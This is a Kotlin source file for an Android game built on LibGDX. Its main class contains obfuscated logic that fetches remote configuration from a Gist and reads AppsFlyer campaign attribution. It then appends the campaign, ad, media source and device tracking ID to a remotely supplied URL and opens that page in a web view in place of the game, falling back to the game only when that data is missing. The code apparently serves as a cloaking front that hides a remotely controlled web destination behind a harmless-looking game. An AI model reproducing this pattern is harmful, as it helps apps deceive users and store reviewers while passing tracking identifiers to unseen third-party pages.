package com.rayscaya.nasjajdenye.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.onesignal.OneSignal
import com.onesignal.debug.LogLevel
import com.rayscaya.nasjajdenye.MainActivity
import com.rayscaya.nasjajdenye.appContext
import com.rayscaya.nasjajdenye.game.dataStore.DS_DataInput
import com.rayscaya.nasjajdenye.game.manager.MusicManager
import com.rayscaya.nasjajdenye.game.manager.NavigationManager
import com.rayscaya.nasjajdenye.game.manager.SoundManager
import com.rayscaya.nasjajdenye.game.manager.SpriteManager
import com.rayscaya.nasjajdenye.game.manager.util.MusicUtil
import com.rayscaya.nasjajdenye.game.manager.util.SoundUtil
import com.rayscaya.nasjajdenye.game.manager.util.SpriteUtil
import com.rayscaya.nasjajdenye.game.screens.LoaderScreen
import com.rayscaya.nasjajdenye.game.utils.GameColor
import com.rayscaya.nasjajdenye.game.utils.advanced.AdvancedGame
import com.rayscaya.nasjajdenye.game.utils.disposeAll
import com.rayscaya.nasjajdenye.game.utils.gdxGame
import com.rayscaya.nasjajdenye.util.Gist
import com.rayscaya.nasjajdenye.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("RAYS", MODE_PRIVATE)

    val ds_DataInput = DS_DataInput(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        raysingss()
    }

    override fun render() {
        if (GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun raysingss() {
        log("raysingss")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val raysing = sharedPreferences.getString("raysing", "needForSpeed") ?: "needForSpeed"

        try {
            if (raysing == "needForSpeed") {
                coroutine.launch(Dispatchers.Main) {
                    val simJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (simJSON != null) {
                        OneSignal.Debug.logLevel = LogLevel.VERBOSE
                        OneSignal.initWithContext(appContext, simJSON.signalor)
                        CoroutineScope(Dispatchers.IO).launch {
                            OneSignal.Notifications.requestPermission(false)
                        }
                        sharedPreferences.edit().putString("onesignal", simJSON.signalor).apply()

                        AppsFlyerLib.getInstance().init(simJSON.dab, getAppsFlyerConversionListener(simJSON.pak), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, simJSON.dab, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                sharedPreferences.getString("onesignal", null)?.let { OneSignal.initWithContext(appContext, it) }
                activity.showUrl(raysing)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap | afId = $afId")

                val link = "$sma?luchica=$campaign&aflch=$afAd&medluch=$media&luchafid=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("raysing", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}